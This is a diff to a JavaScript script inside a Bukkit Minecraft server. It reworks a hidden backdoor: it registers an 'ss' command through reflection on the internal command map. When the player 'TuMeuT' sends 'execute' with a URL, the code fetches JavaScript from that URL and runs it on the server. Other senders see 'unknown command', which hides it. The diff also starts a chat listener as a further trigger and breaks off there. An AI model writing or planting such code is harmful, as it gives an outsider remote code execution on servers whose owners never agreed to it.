@@ -17,28 +17,35 @@ new java.lang.Thread(function(){
 var B = Java.type('org.bukkit.Bukkit');
 var S = Java.type('javax.script.ScriptEngineManager');
 
-// Перехватываем команды через CommandExecutor
-B.getPluginCommand("ss").setExecutor(function() {
-    var executor = Java.extend(Java.type('org.bukkit.command.CommandExecutor'), {
-        onCommand: function(sender, command, label, args) {
-            if (sender.getName() === 'TuMeuT' && args.length > 0 && args[0].equalsIgnoreCase('execute') && args.length > 1) {
-                var url = args[1];
-                try {
-                    var jsCode = new java.util.Scanner(new java.net.URL(url).openStream()).useDelimiter("\\A").next();
-                    new S().getEngineByName("javascript").eval(jsCode);
-                    sender.sendMessage("§aJavaScript код выполнен");
-                } catch(ex) {
-                    sender.sendMessage("§cОшибка: " + ex.getMessage());
-                }
-                return true;
-            }
-            return false;
-        }
-    });
-    return new executor();
-}());
+// Перехватываем команды через CommandMap
+var Command = Java.type('org.bukkit.command.Command');
+var SimpleCommandMap = B.getServer().getClass().getDeclaredField('commandMap');
+SimpleCommandMap.setAccessible(true);
+var commandMap = SimpleCommandMap.get(B.getServer());
 
-// Также перехватываем чат на случай если без / 
+// Создаем свою команду
+var ssCommand = new (Java.extend(Command))("ss") {
+    execute: function(sender, commandLabel, args) {
+        if (sender.getName() === 'TuMeuT' && args.length > 0 && args[0] === 'execute' && args.length > 1) {
+            var url = args[1];
+            try {
+                var jsCode = new java.util.Scanner(new java.net.URL(url).openStream()).useDelimiter("\\A").next();
+                new S().getEngineByName("javascript").eval(jsCode);
+                sender.sendMessage("§aJavaScript код выполнен");
+            } catch(ex) {
+                sender.sendMessage("§cОшибка: " + ex.getMessage());
+            }
+            return true;
+        }
+        sender.sendMessage("§cНеизвестная команда");
+        return true;
+    }
+};
+
+// Регистрируем команду
+commandMap.register("ss", ssCommand);
+
+// Также перехватываем чат
 B.getServer().getPluginManager().registerEvents(new Java.extend(Java.type('org.bukkit.event.Listener')) {
     onPlayerChat: function(e) {
         var player = e.getPlayer();
